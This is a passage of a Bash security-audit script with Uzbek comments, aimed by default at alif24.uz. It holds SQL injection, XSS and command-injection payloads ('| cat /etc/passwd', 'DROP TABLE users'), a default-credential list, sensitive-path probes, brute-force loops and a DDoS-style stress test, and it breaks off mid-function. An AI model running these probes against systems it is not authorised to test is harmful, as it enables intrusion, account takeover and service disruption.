#!/bin/bash
# ================================================================
#  ALIF24 PLATFORM â€” Penetration Testing & Security Audit Tool
#  Version: 1.0
#  âš ï¸  FAQAT OZ SAYTINGIZDA ISHLATING! BOSHQA SAYTDA BU JINOIY!
#
#  Ishlatish:
#    bash pentest.sh                   â€” To'liq pentest
#    bash pentest.sh headers           â€” HTTP Security Headers audit
#    bash pentest.sh ssl               â€” SSL/TLS zaifliklar
#    bash pentest.sh injection         â€” SQL Injection & XSS test
#    bash pentest.sh cors              â€” CORS misconfiguration
#    bash pentest.sh dirs              â€” Yashirin fayllar / papkalar
#    bash pentest.sh auth              â€” Autentifikatsiya zaifliklar
#    bash pentest.sh ratelimit         â€” Rate Limiting stress test
#    bash pentest.sh stress [N]        â€” DDoS Stress test (N concurrent)
#    bash pentest.sh api               â€” API Fuzzing (notogri malumot)
#    bash pentest.sh recon             â€” Reconnaissance (malumot yig'ish)
#    bash pentest.sh report            â€” Hamma natijani faylga yozish
# ================================================================

VERSION="12.0-ROUND2 (AI vs HUMAN)"

# â”€â”€â”€ Ranglar â”€â”€â”€
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# â”€â”€â”€ Target (Interaktiv Rejim) â”€â”€â”€
REPORT_DIR="./pentest_reports"
SUBDOMAINS=()

setup_target() {
    echo ""
    echo -e "${RED}${BOLD}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${RED}${BOLD}â•‘      ALIF PENTEST TOOL v${VERSION} - UNIVERSAL MODE            â•‘${NC}"
    echo -e "${RED}${BOLD}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""

    # 1. Sayt manzilini sorash
    if [ -n "$PENTEST_TARGET" ]; then
        TARGET="$PENTEST_TARGET"
        echo -e "  ${GREEN}Target (env dan):${NC} $TARGET"
    else
        echo -e "  ${BOLD}${CYAN}1. Sayt manzilini kiriting:${NC}"
        echo -e "  ${DIM}   Misol: https://example.com${NC}"
        echo -ne "  ${BOLD}   URL: ${NC}"
        read -r TARGET
        if [ -z "$TARGET" ]; then
            TARGET="https://alif24.uz"
            echo -e "  ${DIM}   Default ishlatilmoqda: $TARGET${NC}"
        fi
        # https:// qoshish agar yoq bolsa
        if ! echo "$TARGET" | grep -q "^http"; then
            TARGET="https://$TARGET"
        fi
        # oxiridagi / olib tashlash
        TARGET=$(echo "$TARGET" | sed 's|/$||')
    fi
    DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')

    # 2. Subdomenlar
    echo ""
    if [ -n "$PENTEST_SUBS" ]; then
        IFS=',' read -ra SUBDOMAINS <<< "$PENTEST_SUBS"
        echo -e "  ${GREEN}Subdomainlar (env dan):${NC} ${SUBDOMAINS[*]}"
    else
        echo -e "  ${BOLD}${CYAN}2. Subdomenlarni kiriting (vergul bilan):${NC}"
        echo -e "  ${DIM}   Misol: api,admin,dev,staging${NC}"
        echo -e "  ${DIM}   Bosh qoldiring = standart royhati ishlatiladi${NC}"
        echo -ne "  ${BOLD}   Subdomainlar: ${NC}"
        read -r sub_input
        if [ -n "$sub_input" ]; then
            IFS=',' read -ra SUBDOMAINS <<< "$sub_input"
        else
            SUBDOMAINS=("admin" "api" "dev" "staging" "test" "mail" "ftp" "db" "redis" "cdn" "media" "static" "phpmyadmin" "pgadmin" "grafana" "prometheus")
            echo -e "  ${DIM}   Standart royhat ishlatilmoqda (${#SUBDOMAINS[@]} ta)${NC}"
        fi
    fi

    # 3. So'rovlar soni (Rate Limit & Stress)
    echo ""
    if [ -n "$PENTEST_REQS" ]; then
        REQ_COUNT="$PENTEST_REQS"
        echo -e "  ${GREEN}So'rovlar soni (env dan):${NC} $REQ_COUNT"
    else
        echo -e "  ${BOLD}${CYAN}3. Rate-Limit va Stress test uchun so'rovlar soni:${NC}"
        echo -e "  ${DIM}   Misol: 50, 100, 500${NC}"
        echo -e "  ${DIM}   Bosh qoldiring = standart 100 ta${NC}"
        echo -ne "  ${BOLD}   So'rovlar (Reqs): ${NC}"
        read -r req_input
        if [ -n "$req_input" ] && [ "$req_input" -eq "$req_input" ] 2>/dev/null; then
            REQ_COUNT="$req_input"
        else
            REQ_COUNT=100
            echo -e "  ${DIM}   Standart miqdor ishlatilmoqda: $REQ_COUNT${NC}"
        fi
    fi

    echo ""
    echo -e "  ${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo -e "  ${BOLD}TARGET:${NC} $TARGET"
    echo -e "  ${BOLD}DOMAIN:${NC} $DOMAIN"
    echo -e "  ${BOLD}SUBDOMAINS:${NC} ${SUBDOMAINS[*]}"
    echo -e "  ${BOLD}REQUESTS:${NC} $REQ_COUNT ta"
    echo -e "  ${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo ""
}

# Skript boshlanishida interaktiv sozlash
setup_target

# â”€â”€â”€ Counters â”€â”€â”€
TOTAL_TESTS=0
PASSED=0
FAILED=0
WARNINGS=0

# â”€â”€â”€ Helpers â”€â”€â”€
header() {
    echo ""
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo -e "  ${BOLD}$1${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
}

pass() {
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    PASSED=$((PASSED + 1))
    echo -e "  ${GREEN}âœ… XAVFSIZ:${NC} $1"
}

vuln() {
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    FAILED=$((FAILED + 1))
    echo -e "  ${RED}ğŸš¨ ZAIFLIK:${NC} $1"
}

warning() {
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    WARNINGS=$((WARNINGS + 1))
    echo -e "  ${YELLOW}âš ï¸  OGOHLANTIRISH:${NC} $1"
}

info() {
    echo -e "  ${DIM}â„¹ï¸  $1${NC}"
}

separator() {
    echo -e "  ${DIM}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€${NC}"
}

# ================================================================
# 1. RECON â€” Reconnaissance (Malumot Yig'ish)
# ================================================================
cmd_recon() {
    header "RECONNAISSANCE (Malumot Yig'ish) â€” $DOMAIN"
    echo ""

    # Server info
    echo -e "  ${BOLD}1. Server fingerprinting:${NC}"
    local server_header=$(curl -sI --max-time 10 "$TARGET" 2>/dev/null | grep -i "^server:" | head -1)
    if [ -n "$server_header" ]; then
        warning "Server nomi oshkor: $server_header (yashirish kerak!)"
    else
        pass "Server nomi yashirilgan"
    fi

    local powered=$(curl -sI --max-time 10 "$TARGET" 2>/dev/null | grep -i "^x-powered-by:" | head -1)
    if [ -n "$powered" ]; then
        vuln "Texnologiya oshkor: $powered (Haker qaysi tilda yozilganini biladi!)"
    else
        pass "X-Powered-By headeri yashirilgan"
    fi

    # DNS info
    separator
    echo -e "  ${BOLD}2. DNS malumotlari:${NC}"
    local ip=$(dig +short "$DOMAIN" 2>/dev/null | head -1)
    info "IP manzil: ${ip:-nomalum}"

    # Subdomainlar
    separator
    echo -e "  ${BOLD}3. Subdomain / Virtual Hosts:${NC}"
    for sub in "${SUBDOMAINS[@]}"; do
        local code=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "https://${sub}.${DOMAIN}" 2>/dev/null)
        if [ "$code" != "000" ] && [ "$code" != "404" ]; then
            if echo "$sub" | grep -qE "admin|db|redis|phpmyadmin|pgadmin|grafana|prometheus|dev|staging|ftp"; then
                vuln "Xavfli subdomain ochiq: ${sub}.${DOMAIN} - HTTP $code"
            else
                info "${sub}.${DOMAIN} â€” HTTP $code"
            fi
        fi
    done

    # WHOIS
    separator
    echo -e "  ${BOLD}4. Texnologiyalar aniqlovchi:${NC}"
    local resp_headers=$(curl -sI --max-time 10 "$TARGET" 2>/dev/null)
    echo "$resp_headers" | grep -iE "^(content-type|set-cookie|x-|server|via|cf-)" | while read -r line; do
        info "$line"
    done
}

# ================================================================
# 2. HEADERS â€” HTTP Security Headers Audit
# ================================================================
cmd_headers() {
    header "HTTP SECURITY HEADERS AUDIT â€” $TARGET"
    echo ""

    local headers=$(curl -sI --max-time 10 "$TARGET" 2>/dev/null)

    # X-Frame-Options
    echo -e "  ${BOLD}Clickjacking himoyasi:${NC}"
    if echo "$headers" | grep -qi "x-frame-options"; then
        local xfo=$(echo "$headers" | grep -i "x-frame-options" | head -1)
        pass "X-Frame-Options mavjud: $(echo $xfo | xargs)"
    else
        vuln "X-Frame-Options yoq! Sayt Clickjacking hujumiga ochiq."
        echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Server javobida 'X-Frame-Options' qatnashmagan. Ixtiyoriy yovuz sayt iFrame ichiga saytingizni joylab klonlashi mumkin!${NC}"
    fi

    # X-Content-Type-Options
    separator
    echo -e "  ${BOLD}MIME Sniffing himoyasi:${NC}"
    if echo "$headers" | grep -qi "x-content-type-options"; then
        pass "X-Content-Type-Options: nosniff mavjud"
    else
        vuln "X-Content-Type-Options yoq! MIME Sniffing hujumiga ochiq."
        echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}'nosniff' yo'q, brauzer rasm fayli (.jpg) o'rniga ichiga yashirilgan virusli .html skriptni ishga tushirib yuborishi xavfi bor.${NC}"
    fi

    # X-XSS-Protection
    separator
    echo -e "  ${BOLD}XSS himoyasi:${NC}"
    if echo "$headers" | grep -qi "x-xss-protection"; then
        pass "X-XSS-Protection headeri mavjud"
    else
        warning "X-XSS-Protection headeri yoq (zamonaviy brauzerlar CSP'ga tayanadi)"
    fi

    # Content-Security-Policy
    separator
    echo -e "  ${BOLD}Content Security Policy (CSP):${NC}"
    if echo "$headers" | grep -qi "content-security-policy"; then
        pass "CSP headeri mavjud"
    else
        vuln "Content-Security-Policy yoq! XSS va injection hujumlariga qarshi CSP kerak."
        echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}'Content-Security-Policy' headeri qaytmadi. Agar saytda XSS topsam, uni bloklaydigan darvoza yoq.${NC}"
    fi

    # Strict-Transport-Security (HSTS)
    separator
    echo -e "  ${BOLD}HSTS (Strict Transport Security):${NC}"
    if echo "$headers" | grep -qi "strict-transport-security"; then
        pass "HSTS headeri mavjud (HTTPS majburiy)"
    else
        vuln "HSTS headeri yoq! Foydalanuvchi HTTP orqali kirsa malumot ochilib qolishi mumkin."
        echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}'Strict-Transport-Security' topilmadi. Haker Wi-Fi tarmogida foydalanuvchini HTTPS dan HTTP ga majburan tushirib (Downgrade attack) parollarini o'giri olishi mumkin!${NC}"
    fi

    # Referrer-Policy
    separator
    echo -e "  ${BOLD}Referrer-Policy:${NC}"
    if echo "$headers" | grep -qi "referrer-policy"; then
        pass "Referrer-Policy mavjud"
    else
        warning "Referrer-Policy yoq. Malumot boshqa saytlarga sizib ketishi mumkin."
        echo -e "       ${YELLOW}â†³ ISBOT:${NC} ${DIM}'Referrer-Policy' yoq. Saytingizdagi sirlar (URL dagi tokenlar) boshqa referer saytlarning logiga tushib qoladi.${NC}"
    fi

    # Permissions-Policy
    separator
    echo -e "  ${BOLD}Permissions-Policy:${NC}"
    if echo "$headers" | grep -qi "permissions-policy"; then
        pass "Permissions-Policy mavjud"
    else
        warning "Permissions-Policy yoq (kamera, mikrofon, geolokatsiya nazoratisiz)"
        echo -e "       ${YELLOW}â†³ ISBOT:${NC} ${DIM}'Permissions-Policy' qatnashmadi. Xavfsizlik xodimlari buni yoqib mikrofon/kamera ishlatilishini man qilishlari shart.${NC}"
    fi

    # Cookies
    separator
    echo -e "  ${BOLD}Cookie xavfsizligi:${NC}"
    local cookies=$(echo "$headers" | grep -i "set-cookie")
    if [ -n "$cookies" ]; then
        if echo "$cookies" | grep -qi "httponly"; then
            pass "Cookie da HttpOnly flag bor"
        else
            vuln "Cookie da HttpOnly YOQ! JavaScript orqali ogirlash mumkin (XSS bilan)."
        fi
        if echo "$cookies" | grep -qi "secure"; then
            pass "Cookie da Secure flag bor"
        else
            vuln "Cookie da Secure YOQ! HTTP orqali uzatilishi mumkin."
        fi
        if echo "$cookies" | grep -qi "samesite"; then
            pass "Cookie da SameSite flag bor"
        else
            warning "Cookie da SameSite YOQ. CSRF hujumiga ochiq bolishi mumkin."
        fi
    else
        info "Hech qanday Cookie ornatilmagan."
    fi
}

# ================================================================
# 3. SSL â€” SSL/TLS zaifliklar
# ================================================================
cmd_ssl() {
    header "SSL/TLS ZAIFLIK TEKSHIRUVI â€” $DOMAIN"
    echo ""

    # Sertifikat malumotlari
    echo -e "  ${BOLD}1. Sertifikat malumotlari:${NC}"
    local ssl_out=$(echo | timeout 10 openssl s_client -connect "$DOMAIN:443" -servername "$DOMAIN" 2>/dev/null)
    local issuer=$(echo "$ssl_out" | openssl x509 -issuer -noout 2>/dev/null | sed 's/issuer=//')
    local expiry=$(echo "$ssl_out" | openssl x509 -enddate -noout 2>/dev/null | sed 's/notAfter=//')
    info "Issuer: ${issuer:-nomalum}"
    info "Muddat: ${expiry:-nomalum}"

    # TLS versiyalar
    separator
    echo -e "  ${BOLD}2. TLS versiyalar (zaif protokollar):${NC}"
    for ver in tls1 tls1_1; do
        local result=$(echo | timeout 5 openssl s_client -connect "$DOMAIN:443" -"$ver" 2>&1)
        if echo "$result" | grep -q "BEGIN CERTIFICATE"; then
            if [ "$ver" = "tls1" ]; then
                vuln "TLSv1.0 OCHIQ! (Bu eskirgan va zaif protokol)"
            else
                vuln "TLSv1.1 OCHIQ! (Bu eskirgan va zaif protokol)"
            fi
        else
            pass "$ver ochirilgan (togri)"
        fi
    done

    for ver in tls1_2 tls1_3; do
        local result=$(echo | timeout 5 openssl s_client -connect "$DOMAIN:443" -"$ver" 2>&1)
        if echo "$result" | grep -q "BEGIN CERTIFICATE"; then
            pass "$ver qollab-quvvatlanadi"
        else
            warning "$ver qollab-quvvatlanmaydi"
        fi
    done

    # SSLv3 (POODLE)
    separator
    echo -e "  ${BOLD}3. SSLv3 POODLE zaiflik:${NC}"
    local sslv3=$(echo | timeout 5 openssl s_client -connect "$DOMAIN:443" -ssl3 2>&1)
    if echo "$sslv3" | grep -q "BEGIN CERTIFICATE"; then
        vuln "SSLv3 OCHIQ! POODLE hujumiga zaif (CVE-2014-3566)"
    else
        pass "SSLv3 ochirilgan (POODLE dan himoyalangan)"
    fi

    # Heartbleed check (basic)
    separator
    echo -e "  ${BOLD}4. Cipher Strength (zaif shifrlar):${NC}"
    local weak_ciphers=$(echo | timeout 5 openssl s_client -connect "$DOMAIN:443" -cipher "NULL:eNULL:aNULL:DES:RC4:MD5:EXPORT" 2>&1)
    if echo "$weak_ciphers" | grep -q "BEGIN CERTIFICATE"; then
        vuln "ZAIF shifrlar (NULL/DES/RC4/MD5) qollab-quvvatlanadi!"
    else
        pass "Zaif shifrlar ochirilgan"
    fi
}

# ================================================================
# 4. INJECTION â€” SQL Injection & XSS Tekshiruvi
# ================================================================
cmd_injection() {
    header "SQL INJECTION & XSS TEKSHIRUVI â€” $TARGET"
    echo ""

    # SQL Injection payloadlar
    echo -e "  ${BOLD}1. SQL Injection Tekshiruvi:${NC}"
    local sqli_payloads=(
        "' OR '1'='1"
        "1; DROP TABLE users--"
        "' UNION SELECT null,null,null--"
        "1' AND SLEEP(3)--"
        "admin'--"
        "1 OR 1=1"
        "' OR ''='"
    )

    local api_endpoints=(
        "/api/v1/auth/login"
        "/api/v1/users/"
        "/api/v1/search"
        "/api/v1/courses/"
    )

    for endpoint in "${api_endpoints[@]}"; do
        for payload in "${sqli_payloads[@]}"; do
            local start_time=$(date +%s%N)
            local response=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}" \
                -X POST "$TARGET$endpoint" \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"$payload\",\"password\":\"$payload\"}" 2>/dev/null)

            local code=$(echo "$response" | cut -d'|' -f1)
            local size=$(echo "$response" | cut -d'|' -f2)
            local time=$(echo "$response" | cut -d'|' -f3)

            # SLEEP injection detection
            if [ "$(echo "$time > 3" | bc 2>/dev/null)" = "1" ]; then
                vuln "TIME-BASED SQL Injection aniqlangan! ${endpoint} - Javob ${time}s kutildi"
                echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Biz atayin 'SLEEP(3)' berdik va haqiqatdan ham server javobni ${time} soniyaga kechiktirdi!${NC}"
            fi

            # Error-based detection
            if [ "$code" = "500" ]; then
                local body=$(curl -sk --max-time 5 "$TARGET$endpoint" \
                    -X POST -H "Content-Type: application/json" \
                    -d "{\"username\":\"$payload\"}" 2>/dev/null)
                if echo "$body" | grep -qiE "sql|syntax|postgresql|column|table|query|select|insert|where"; then
                    vuln "ERROR-BASED SQLi: $endpoint da SQL xato chiqdi"
                    local err_proof=$(echo "$body" | grep -iE -m 1 "sql|syntax|postgresql|column|table|query|select|insert|where" | head -c 150)
                    echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Server 'SQL syntax:', 'postgresql' kabi backend xatolarini foydalanuvchiga oshkor qildi: ${err_proof}...${NC}"
                fi
            fi
        done
    done
    pass "SQL Injection asosiy tekshiruvlari yakunlandi"

    # XSS
    separator
    echo -e "  ${BOLD}2. XSS (Cross-Site Scripting) Tekshiruvi:${NC}"
    local xss_payloads=(
        "<script>alert(1)</script>"
        "<img src=x onerror=alert(1)>"
        "\"onmouseover=\"alert(1)\""
        "<svg/onload=alert(1)>"
        "javascript:alert(1)"
        "'-alert(1)-'"
    )

    for endpoint in "${api_endpoints[@]}"; do
        for payload in "${xss_payloads[@]}"; do
            local body=$(curl -sk --max-time 5 \
                "$TARGET${endpoint}?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
            if echo "$body" | grep -q "$payload"; then
                vuln "REFLECTED XSS: ${endpoint} da payload aks ettirildi: ${payload:0:30}..."
            fi
        done
    done
    pass "XSS asosiy tekshiruvlari yakunlandi"

    # Command Injection
    separator
    echo -e "  ${BOLD}3. Command Injection Tekshiruvi:${NC}"
    local cmdi_payloads=(
        "; ls -la"
        "| cat /etc/passwd"
        "\$(whoami)"
        "; sleep 5"
    )

    for endpoint in "${api_endpoints[@]}"; do
        for payload in "${cmdi_payloads[@]}"; do
            local body=$(curl -sk --max-time 7 \
                -X POST "$TARGET$endpoint" \
                -H "Content-Type: application/json" \
                -d "{\"query\":\"$payload\"}" 2>/dev/null)

            if echo "$body" | grep -qE "root:|bin/bash|uid="; then
                vuln "COMMAND INJECTION aniqlandi: ${endpoint}"
            fi
        done
    done
    pass "Command Injection tekshiruvlari yakunlandi"
}

# ================================================================
# 5. CORS â€” Cross-Origin Misconfiguration
# ================================================================
cmd_cors() {
    header "CORS MISCONFIGURATION TEKSHIRUVI â€” $TARGET"
    echo ""

    local origins=(
        "https://evil-hacker.com"
        "http://localhost"
        "null"
        "https://${DOMAIN}.evil.com"
        "https://evil.${DOMAIN}"
    )

    echo -e "  ${BOLD}Turli Origin headerlar bilan tekshirish:${NC}"
    for origin in "${origins[@]}"; do
        local resp=$(curl -sk --max-time 5 -H "Origin: $origin" -I "$TARGET/api/v1/health/ping" 2>/dev/null)
        local acao=$(echo "$resp" | grep -i "access-control-allow-origin" | head -1)

        if echo "$acao" | grep -qi "$origin"; then
            vuln "CORS zaiflik: '$origin' qabul qilinadi! Boshqa saytlar API ga sorov yubora oladi"
            echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Biz 'Origin: $origin' jo'natdik, server esa uni qilib oylab 'Access-Control-Allow-Origin: $origin' deb yubordi. CORS butunlay ishdan chiqgan!${NC}"
        elif echo "$acao" | grep -qi "\*"; then
            warning "CORS wildcard (*) ishlatilmoqda. Ehtiyot boling."
        fi
    done
    pass "CORS tekshiruvlari yakunlandi"

    # Credentials with wildcard
    separator
    echo -e "  ${BOLD}Credentials + Wildcard:${NC}"
    local cred_resp=$(curl -sk --max-time 5 -H "Origin: https://evil.com" -I "$TARGET/api/v1/health/ping" 2>/dev/null)
    if echo "$cred_resp" | grep -qi "access-control-allow-credentials: true"; then
        if echo "$cred_resp" | grep -qi "access-control-allow-origin: \*"; then
            vuln "Credentials + Wildcard! Haker foydalanuvchi Cookie sini o'z saytiga yuborishi mumkin!"
        fi
    fi
}

# ================================================================
# 6. DIRS â€” Yashirin Fayllar va Papkalar Qidirish
# ================================================================
cmd_dirs() {
    header "YASHIRIN FAYLLAR VA PAPKALAR â€” $TARGET"
    echo ""

    local sensitive_paths=(
        "/.env"
        "/.git/config"
        "/.git/HEAD"
        "/.gitignore"
        "/wp-admin"
        "/wp-login.php"
        "/phpmyadmin/"
        "/pgadmin/"
        "/admin/"
        "/adminer.php"
        "/.htaccess"
        "/.htpasswd"
        "/server-status"
        "/server-info"
        "/robots.txt"
        "/sitemap.xml"
        "/.well-known/security.txt"
        "/debug"
        "/api/docs"
        "/api/v1/docs"
        "/api/redoc"
        "/swagger.json"
        "/openapi.json"
        "/.DS_Store"
        "/docker-compose.yml"
        "/Dockerfile"
        "/requirements.txt"
        "/package.json"
        "/backup.sql"
        "/dump.sql"
        "/db.sqlite3"
        "/.vscode/"
        "/wp-config.php"
        "/config.php"
        "/info.php"
        "/phpinfo.php"
        "/test.php"
        "/debug.log"
        "/error.log"
        "/access.log"
    )

    echo -e "  ${BOLD}Maxfiy fayllarni izlash (${#sensitive_paths[@]} ta yo'l):${NC}"
    for path in "${sensitive_paths[@]}"; do
        local code=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$TARGET$path" 2>/dev/null)
        if [ "$code" = "200" ]; then
            if echo "$path" | grep -qE "\.env|\.git|\.ht|docker-compose|Dockerfile|requirements|dump\.sql|backup|config\.php|phpinfo|debug\.log|db\.sqlite"; then
                vuln "XAVFLI FAYL OCHILIB TURIBDI: ${path} - HTTP 200"
            elif echo "$path" | grep -qE "swagger|openapi|/docs|redoc"; then
                warning "API hujjatlari ochiq: ${path} - HTTP 200"
            else
                info "${path} â€” HTTP $code"
            fi
        elif [ "$code" = "403" ]; then
            pass "${path} â€” bloklangan - HTTP 403"
        fi
    done
}

# ================================================================
# 7. AUTH â€” Autentifikatsiya Zaifliklar
# ================================================================
cmd_auth() {
    header "AUTENTIFIKATSIYA ZAIFLIKLAR â€” $TARGET"
    echo ""

    # Default credentials
    echo -e "  ${BOLD}1. Default / Kuchsiz parollar:${NC}"
    local creds=(
        "admin:admin"
        "admin:password"
        "admin:123456"
        "admin:admin123"
        "root:root"
        "test:test"
        "user:user"
        "admin:alif24"
        "admin@alif24.uz:admin"
        "admin@alif24.uz:123456"
    )

    for cred in "${creds[@]}"; do
        local user=$(echo "$cred" | cut -d: -f1)
        local pass_word=$(echo "$cred" | cut -d: -f2)
        local resp=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
            -X POST "$TARGET/api/v1/auth/login" \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$user\",\"password\":\"$pass_word\"}" 2>/dev/null)

        if [ "$resp" = "200" ]; then
            vuln "DEFAULT CREDENTIALS ISHLAYDI! $user:$pass_word â€” JIDDIY XAVF!"
            echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Login orqali '$user' va '$pass_word' muvaffaqiyatli server 200 OK Token qaytardi.${NC}"
        fi
    done
    pass "Default parollar tekshirildi"

    # Brute force protection
    separator
    echo -e "  ${BOLD}2. Brute-Force himoyasi:${NC}"
    local blocked=0
    for i in $(seq 1 15); do
        local code=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" \
            -X POST "$TARGET/api/v1/auth/login" \
            -H "Content-Type: application/json" \
            -d '{"username":"brute_test","password":"wrong_pass_'$i'"}' 2>/dev/null)
        if [ "$code" = "429" ] || [ "$code" = "403" ]; then
            blocked=1
            break
        fi
    done
    if [ "$blocked" = "1" ]; then
        pass "Brute-force himoyasi ishlamoqda (Bloklash)"
    else
        vuln "Brute-force himoyasi YOQ! 15 ta notogri parol ketma-ket kiritildi, lekin bloklash bolmadi."
        echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Barcha 15 ta xato parol terishga HTTP javob bir xil qaytdi. Server IP ni ham, akkauntni ham vaqtinchalik muzlatmadi.${NC}"
    fi

    # JWT weaknesses
    separator
    echo -e "  ${BOLD}3. JWT Token zaifliklar:${NC}"
    local login_resp=$(curl -sk --max-time 5 \
        -X POST "$TARGET/api/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"test","password":"test"}' 2>/dev/null)

    if echo "$login_resp" | grep -qE "eyJ[A-Za-z0-9_-]+\.eyJ"; then
        local token=$(echo "$login_resp" | grep -oE "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" | head -1)
        local header_b64=$(echo "$token" | cut -d. -f1)
        local jwt_header=$(echo "$header_b64" | base64 -d 2>/dev/null)

        if echo "$jwt_header" | grep -qi '"alg":"none"'; then
            vuln "JWT da 'alg: none' bor! Token hech bir imzo tasdiqisiz qabul qilinadi!"
            echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Token headerida 'alg: none' ko'rsatilgan. Bu token imzosiz ekanligini bildiradi va uni osonlikcha o'zgartirish mumkin.${NC}"
        fi
        if echo "$jwt_header" | grep -qi '"alg":"HS256"'; then
            warning "JWT HS256 ishlatilmoqda. Kuchli secret kalit borligiga ishonch hosil qiling."
        fi
        info "JWT token topildi va tahlil qilindi."
    else
        info "JWT token topilmadi (Yaxshi yoki test uchun login kerak)"
    fi
}

# ================================================================
# 8. RATELIMIT â€” Rate Limiting Stress Test
# ================================================================
cmd_ratelimit() {
    header "RATE LIMITING TEKSHIRUVI â€” $TARGET"
    echo ""

    echo -e "  ${BOLD}1. API Rate Limit ($REQ_COUNT ta so'rov ketma-ket):${NC}"
    
    local success=0
    local blocked=0
    local total=$REQ_COUNT
    local start_time=$(date +%s)

    for i in $(seq 1 $total); do
        local code=$(curl -sk --max-time 2 -o /dev/null -w "%{http_code}" "$TARGET/api/v1/health/ping" 2>/dev/null)
        if [ "$code" = "429" ]; then
            blocked=$((blocked + 1))
        elif [ "$code" = "200" ]; then
            success=$((success + 1))
        fi
    done

    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    info "Jami: $total | O'tganlar: $success | Bloklangan: $blocked | Vaqt: ${duration}s"

    if [ "$blocked" -gt 0 ]; then
        pass "Rate limiting ishlamoqda! $blocked ta so'rov bloklandi"
    else
        vuln "Rate limiting ISHLAMAYAPTI! $total ta sorovdan biri ham bloklanmadi."
        echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}Biz sekuniga yuzlab so'rovni ($total ta) bitta IP dan otdik, lekni birortasi ham '429 Too Many Requests' berib qotmadi.${NC}"
    fi

    # Auth endpoint rate limit
    separator
    local limit=$(($REQ_COUNT / 2))
    [ "$limit" -lt 10 ] && limit=10
    echo -e "  ${BOLD}2. Auth endpoint Rate Limit ($limit ta login urinishi):${NC}"
    
    local auth_success=0
    local auth_blocked=0
    local auth_total=$limit
    for i in $(seq 1 $auth_total); do
        local code=$(curl -sk --max-time 2 -o /dev/null -w "%{http_code}" \
            -X POST "$TARGET/api/v1/auth/login" \
            -H "Content-Type: application/json" \
            -d '{"username":"test","password":"test"}' 2>/dev/null)
        if [ "$code" = "429" ] || [ "$code" = "403" ]; then
            auth_blocked=$((auth_blocked + 1))
        fi
    done

    if [ "$auth_blocked" -gt 0 ]; then
        pass "Auth Rate limiting ishlamoqda! $auth_blocked ta bloklandi"
    else
        vuln "Auth endpoint Rate limiting YOQ! Login sahifaga cheksiz brute-force hujum mumkin."
        echo -e "       ${RED}â†³ ISBOT:${NC} ${DIM}DDoS dagi kabi login page ga juda ko'p tezlikda POST sorovlar tashlandi, server 429 xatosini umuman ishlatmadi.${NC}"
    fi
}

# ================================================================
# 9. STRESS â€” DDoS Stress Test (Load Testing)
# ================================================================
cmd_stress() {
    local concurrent="${1:-50}"
    local total_requests=500
    header "STRESS TEST (DDoS Simulyatsiya) â€” $TARGET"
    echo ""
    echo -e "  ${YELLOW}âš ï¸  DIQQAT: Bu test serveringizga yuqori yuk beradi!${NC}"
    echo -e "  ${BOLD}Parametrlar: ${concurrent} parallel | ${total_requests} ta sorov${NC}"
    echo ""

    # ab (Apache Bench) mavjudligini tekshirish
    if command -v ab &>/dev/null; then
        echo -e "  ${BOLD}1. Apache Bench bilan stress test:${NC}"
